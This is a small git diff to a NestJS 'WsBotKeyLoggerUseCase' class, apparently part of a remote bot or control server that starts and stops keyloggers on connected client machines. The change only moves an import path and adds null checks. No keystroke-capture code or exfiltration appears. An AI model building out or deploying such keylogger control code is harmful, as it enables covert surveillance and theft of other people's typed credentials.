@@ -1,6 +1,6 @@
 import { KeyLoggerRepository } from "@/src/modules/client/domain/keylogger.repository";
 import { WsClientRepository } from "@/src/modules/ws-client/domain/ws-client.repository";
-import { ControllerRepository } from "@/src/repository/controller/controller.repository";
+import { ControllerRepository } from "@/src/repository/db/controller/controller.repository";
 import { Injectable } from "@nestjs/common";
 
 @Injectable()
@@ -14,6 +14,8 @@ export class WsBotKeyLoggerUseCase {
   async startListening(controllerid: string) {
     const { activeclient } =
       await this.controllerRepository.getControllerById(controllerid);
+
+    if (!activeclient) return;
 
     this.keyLoggerRepository.createKeyLogger(activeclient);
 
@@ -29,7 +31,7 @@ export class WsBotKeyLoggerUseCase {
   async stopListening(controllerid: string) {
     const { activeclient } =
       await this.controllerRepository.getControllerById(controllerid);
-
+    if (!activeclient) return;
     this.keyLoggerRepository.stopKeyLogger(activeclient);
 
     const client = this.wsClientRepository.getClient(activeclient);
